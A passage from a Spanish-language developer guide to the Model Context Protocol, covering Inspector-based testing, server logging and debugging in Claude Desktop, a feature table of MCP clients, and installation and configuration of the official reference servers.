#### 2. Ciclo de cambios

- Hacer cambios en el servidor
- Recompilar (para TypeScript: `tsc` o `npm run build`)
- Reconectar el Inspector
- Testear las funciones afectadas
- Monitorear el panel de mensajes para detectar errores en el protocolo

#### 3. Casos borde

- Enviar inputs inválidos a tools y resources
- Omitir argumentos requeridos en prompts
- Lanzar operaciones concurrentes
- Verificar que el servidor devuelve errores correctamente formateados

> **Buena práctica:** Usar el Inspector antes de integrar con Claude Desktop o cualquier cliente real. Es mucho más rápido iterar aquí que depurar en el cliente final.

---

### Cuándo usar el Inspector vs. otros enfoques

| Situación | Herramienta recomendada |
| --- | --- |
| Verificar que un tool devuelve el resultado correcto | Inspector → tab Tools |
| Ver los logs del servidor en tiempo real | Inspector → panel Notifications |
| Testear una suscripción a un resource | Inspector → tab Resources |
| Depurar el flujo completo con Claude | Claude Desktop + logs de MCP |
| Validar el schema JSON de un tool | Inspector → tab Tools (muestra el schema completo) |

---

## Depuración de servidores MCP

Una depuración efectiva es esencial al desarrollar servidores MCP o integrarlos con aplicaciones. Este módulo cubre las herramientas y estrategias disponibles en el ecosistema MCP.

### Herramientas de depuración disponibles

| Herramienta | Cuándo usarla |
|---|---|
| **MCP Inspector** | Primera parada siempre: testear conectividad, tools, prompts y resources de forma interactiva |
| **Logging del servidor** | Registrar eventos internos durante el ciclo de vida del servidor |
| **Herramientas del cliente** | Logs y estado de conexión expuestos por el cliente MCP (ej. Claude Desktop) |

---

### Implementar logging en el servidor

#### Transporte stdio

Con el transporte `stdio`, todo lo que el servidor escribe a **stderr** es capturado automáticamente por la aplicación host. Lo que se escriba a **stdout** interfiere con el protocolo y no debe usarse para logs.

#### Transporte Streamable HTTP

Con HTTP, stderr no es capturado por el cliente. En cambio se debe usar:

- Notificaciones de log enviadas al cliente
- Agregación de logs server-side propia
- Herramientas HTTP estándar (curl, DevTools Network panel) para inspeccionar requests, headers `Mcp-Session-Id` y streams SSE

#### Enviar notificaciones de log al cliente (todos los transportes)

```python
# Python
@server.tool()
async def my_tool(ctx: Context) -> str:
    await ctx.session.send_log_message(
        level="info",
        data="Servidor iniciado correctamente",
    )
    return "done"
```

```typescript
// TypeScript
await server.sendLoggingMessage({
  level: "info",
  data: "Servidor iniciado correctamente",
});
```

MCP define ocho niveles de severidad (RFC 5424): `debug`, `info`, `notice`, `warning`, `error`, `critical`, `alert` y `emergency`. Los clientes pueden ajustar el nivel mínimo en tiempo de ejecución mediante `logging/setLevel`.

**Eventos importantes para loggear:**

- Pasos de inicialización
- Accesos a resources
- Ejecución de tools
- Condiciones de error
- Métricas de performance

---

### Problemas comunes

#### Directorio de trabajo

Cuando un cliente MCP lanza un servidor stdio, el directorio de trabajo puede ser indefinido (por ejemplo `/` en macOS). Por eso:

- Siempre usar **rutas absolutas** en la configuración y archivos `.env`
- No depender de rutas relativas como `./data`

Ejemplo correcto en `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/Users/usuario/data"
      ]
    }
  }
}
```

#### Variables de entorno

Los servidores MCP lanzados por stdio heredan solo un subconjunto limitado de variables de entorno. Para pasarlas explícitamente:

```json
{
  "mcpServers": {
    "myserver": {
      "command": "mcp-server-myapp",
      "env": {
        "MYAPP_API_KEY": "clave_secreta"
      }
    }
  }
}
```

#### Problemas de inicialización

| Categoría | Causas comunes |
|---|---|
| **Rutas** | Ruta al ejecutable incorrecta; archivos faltantes; problemas de permisos — probar con ruta absoluta en `command` |
| **Configuración** | JSON inválido; campos requeridos faltantes; tipos incorrectos |
| **Entorno** | Variables de entorno faltantes o con valores incorrectos |

#### Problemas de conexión

Cuando el servidor no logra conectarse:

1. Revisar los logs del cliente
2. Verificar que el proceso del servidor está corriendo
3. Testear de forma standalone con el Inspector
4. Verificar compatibilidad de versiones de protocolo
5. Inspeccionar el intercambio `initialize` — el error JSON-RPC `-32602` ("Invalid params") aparece frecuentemente cuando el servidor intenta usar sampling o elicitation con un cliente que no declaró esa capacidad

---

### Depuración en Claude Desktop

#### Ver estado de los servidores conectados

En la ventana de chat, hacer clic en el ícono "+" (Add files, connectors, and more) y hovear sobre **Connectors** para ver los servidores conectados y las tools disponibles.

#### Ubicación de los logs

| Sistema | Ruta |
|---|---|
| macOS | `~/Library/Logs/Claude/mcp*.log` |
| Windows | `%APPDATA%\Claude\logs\mcp*.log` |

```bash
# macOS — seguir logs en tiempo real
tail -n 20 -F ~/Library/Logs/Claude/mcp*.log
```

```powershell
# Windows
type "$env:AppData\Claude\logs\mcp*.log"
```

Los logs capturan: eventos de conexión, problemas de configuración, errores en tiempo de ejecución e intercambio de mensajes del protocolo.

#### Habilitar Chrome DevTools en Claude Desktop

Para inspeccionar errores client-side:

```bash
# macOS
echo '{"allowDevTools": true}' > ~/Library/Application\ Support/Claude/developer_settings.json
```

```powershell
# Windows
'{"allowDevTools": true}' | Set-Content "$env:AppData\Claude\developer_settings.json"
```

Luego abrir DevTools con `Cmd+Option+I` (macOS) o `Ctrl+Alt+I` (Windows). Aparecen dos ventanas DevTools: una para el contenido principal y otra para la barra de título. Usar el panel **Console** para errores client-side y el panel **Network** para inspeccionar payloads y timing.

---

### Ciclo de depuración recomendado

#### Fase de desarrollo inicial

1. Usar el Inspector para testing básico
2. Implementar funcionalidad core
3. Agregar puntos de logging

#### Fase de testing integrado

1. Testear en el cliente MCP destino (ej. Claude Desktop)
2. Monitorear logs
3. Verificar manejo de errores

#### Aplicar cambios eficientemente

| Tipo de cambio | Acción necesaria |
| --- | --- |
| Cambio en configuración | Reiniciar el cliente MCP |
| Cambio en código del servidor | Reiniciar completamente el cliente (cerrar ventana no es suficiente en Claude Desktop) |
| Iteración rápida | Usar el Inspector — no requiere reiniciar el cliente |

---

### Buenas prácticas de logging y seguridad

#### Estrategia de logging

- **Logging estructurado:** formato consistente con contexto, timestamps e IDs de request
- **Manejo de errores:** loggear stack traces con contexto; monitorear patrones de error
- **Performance:** registrar tiempos de operaciones, tamaño de mensajes y latencia

#### Consideraciones de seguridad al depurar

- **Sanitizar logs:** nunca loggear headers `Authorization`, tokens ni credenciales
- **Enmascarar datos personales:** proteger información sensible antes de loggear
- **Control de acceso:** verificar permisos y monitorear patrones de acceso inusuales

---

## Clientes MCP — Ecosistema

Esta sección documenta las aplicaciones que soportan el Protocolo de Contexto de Modelo. Cada cliente puede soportar diferentes capacidades del protocolo.

---

### Categorías de features

Las capacidades que puede soportar un cliente MCP se agrupan en tres bloques:

#### Primitivas del servidor

| Feature | Descripción |
| --- | --- |
| **Resources** | Datos y contenido expuestos por el servidor |
| **Prompts** | Templates predefinidos para interacciones con LLMs |
| **Tools** | Funciones ejecutables que los LLMs pueden invocar |

#### Capacidades de integración

| Feature | Descripción |
| --- | --- |
| **Discovery** | Soporte para notificaciones de cambio de tools/prompts/resources |
| **Instructions** | Guidance que el servidor provee al LLM |

#### Primitivas del cliente

| Feature | Descripción |
| --- | --- |
| **Sampling** | El servidor puede solicitar completions al LLM del cliente |
| **Roots** | El cliente declara los límites del sistema de archivos accesible |
| **Elicitation** | El servidor puede solicitar información al usuario via el cliente |

#### OAuth y autorización

| Feature | Descripción |
| --- | --- |
| **DCR** | Dynamic Client Registration — el cliente soporta registro OAuth dinámico |
| **CIMD** | Client ID Metadata Document — soporte para el documento de metadata del cliente |
| **OAuth Client Credentials** | Extensión para flujos de credenciales de cliente OAuth |
| **Enterprise-Managed Authorization** | Extensión para flujos de identidad empresarial centralizada |

#### Capacidades avanzadas

| Feature | Descripción |
| --- | --- |
| **Tasks** | Seguimiento de operaciones de larga duración |
| **Apps** | Interfaces HTML interactivas en el cliente |

---

### Clientes destacados por categoría

#### Productos Anthropic

| Cliente | Soporte de features | Notas |
| --- | --- | --- |
| **Claude Desktop** | Resources, Prompts, Tools, Roots, Apps, DCR | Cliente de escritorio; conecta servidores locales y remotos |
| **Claude.ai** | Resources, Prompts, Tools, Apps, CIMD, DCR | Versión web; servidores remotos via Custom Connectors |
| **Claude Code** | Resources, Prompts, Tools, Roots, Elicitation, Instructions, Discovery, DCR | CLI de Anthropic; también actúa como servidor MCP |

#### Editores e IDEs

| Cliente | Plataforma | Tools | Notas destacadas |
| --- | --- | --- | --- |
| **Cursor** | Editor propio | Prompts, Tools, Roots, Elicitation, DCR | Soporta STDIO y SSE |
| **Cline** | VS Code | Resources, Tools, Discovery | Crea tools con lenguaje natural; comparte servidores custom |
| **Continue** | VS Code / JetBrains | Resources, Prompts, Tools, Apps | `@` para resources; prompts como slash commands |
| **Amp** | VS Code / JetBrains / Neovim | Resources, Prompts, Tools, Sampling | Multiplayer — compartí threads con tu equipo |
| **JetBrains Junie** | JetBrains / Android Studio | Tools | Config via `mcp.json`; aprobación por comando |
| **Codex (OpenAI)** | Terminal / VS Code | Resources, Tools, Elicitation | STDIO y HTTP streaming con OAuth |
| **Augment Code** | VS Code / JetBrains | Tools | Agentes locales y remotos con awareness del codebase |

#### Agentes de terminal

| Cliente | Tools | Notas |
| --- | --- | --- |
| **Amazon Q CLI** | Prompts, Tools | Open-source; soporte completo de servidores MCP |
| **Gemini CLI** | Prompts, Tools, Instructions, DCR | Open-source; trae Gemini al terminal |
| **GitHub Copilot CLI** | Tools, Discovery, Instructions, Sampling, Elicitation, DCR, OAuth Client Credentials, Tasks | Soporte nativo de GitHub; paralelización con `/fleet` |
| **goose** | Todos los features principales + Apps, DCR | Open-source de Block; el cliente con soporte más amplio |
| **fast-agent** | Resources, Prompts, Tools, Discovery, Sampling, Roots, Elicitation, Instructions | Framework Python; deploy de agentes como servidores MCP |
| **gptme** | Tools | CLI open-source; herramientas integradas para shell y archivos |

#### Plataformas de chat y aplicaciones

| Cliente | Tools | Notas |
| --- | --- | --- |
| **ChatGPT** | Tools, Apps, DCR, CIMD | OpenAI; investigación profunda con servidores remotos |
| **Glama** | Todos los features principales | Workspace unificado; directorio integrado de servidores MCP |
| **Claude Desktop** | Ver tabla Anthropic | — |

#### Frameworks y librerías

| Framework | Lenguaje | Notas |
| --- | --- | --- |
| **BeeAI Framework** | TypeScript | Integración nativa de MCP Tool en workflows agénticos |
| **Genkit** | JavaScript / Firebase | Plugin `genkitx-mcp`; consume servidores MCP como cliente |
| **Daydreams** | TypeScript | Framework para agentes onchain; expone MCP Client |
| **GenAIScript** | JavaScript | Toolbox para prompts programáticos con integración VS Code |

---

### ¿Qué cliente elegir?

| Situación | Recomendación |
| --- | --- |
| Desarrollo con Claude en desktop | Claude Desktop |
| Desarrollo y coding agéntico | Claude Code o Cursor |
| Proyectos en VS Code | Cline, Continue o Amp |
| Proyectos en JetBrains | JetBrains Junie o Augment Code |
| Agents en Python | fast-agent o BeeAI Framework |
| Máximo soporte de features | goose (open-source) o Glama |
| Testeo e inspección de servidores | MCP Inspector |

> **Nota:** Esta lista es mantenida por la comunidad y se actualiza continuamente. El ecosistema de clientes MCP crece rápidamente. Para la lista completa y actualizada, consultar [modelcontextprotocol.io/clients](https://modelcontextprotocol.io/clients).

---

## Servidores MCP de ejemplo

Esta sección documenta los servidores de referencia oficiales y cómo usarlos para explorar las capacidades de MCP.

---

### Servidores de referencia oficiales

Estos servidores son mantenidos por el equipo de MCP y sirven como implementaciones de referencia para demostrar features del protocolo y el uso del SDK:

| Servidor | Descripción |
| --- | --- |
| **Everything** | Servidor de test y referencia con prompts, resources y tools — ideal para explorar el protocolo completo |
| **Fetch** | Obtiene y convierte contenido web para uso eficiente por LLMs |
| **Filesystem** | Operaciones de archivo seguras con controles de acceso configurables |
| **Git** | Herramientas para leer, buscar y manipular repositorios Git |
| **Memory** | Sistema de memoria persistente basado en knowledge graph |
| **Sequential Thinking** | Resolución de problemas dinámica y reflexiva mediante secuencias de pensamiento |
| **Time** | Capacidades de tiempo y conversión de zonas horarias |

> Los servidores archivados (ya sin mantenimiento activo) están disponibles en [servers-archived](https://github.com/modelcontextprotocol/servers-archived) como referencia histórica.

---

### Instalación y uso

#### Servidores TypeScript — via `npx`

```bash
npx -y @modelcontextprotocol/server-memory
```

#### Servidores Python — via `uvx` o `pip`

```bash
# Con uvx (recomendado)
uvx mcp-server-git

# Con pip
pip install mcp-server-git
python -m mcp_server_git
```

---

### Configuración en Claude Desktop

Agregar servidores al archivo `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    },
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/ruta/a/archivos/permitidos"
      ]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "<TU_TOKEN>"
      }
    }
  }
}
```

La clave de cada entrada (`"memory"`, `"filesystem"`, `"github"`) es el nombre con el que el cliente identifica al servidor. El campo `command` con sus `args` define cómo lanzarlo — siempre con rutas absolutas en producción.

---

### Dónde encontrar más servidores

| Fuente | Descripción |
| --- | --- |
| [Integraciones oficiales](https://github.com/modelcontextprotocol/servers#%EF%B8%8F-official-integrations) | Servidores mantenidos por empresas para sus plataformas |
| [Servidores comunitarios](https://github.com/modelcontextprotocol/servers#-community-servers) | Servidores mantenidos por la comunidad |
| [GitHub Discussions](https://github.com/orgs/modelcontextprotocol/discussions) | Foro de la comunidad MCP |
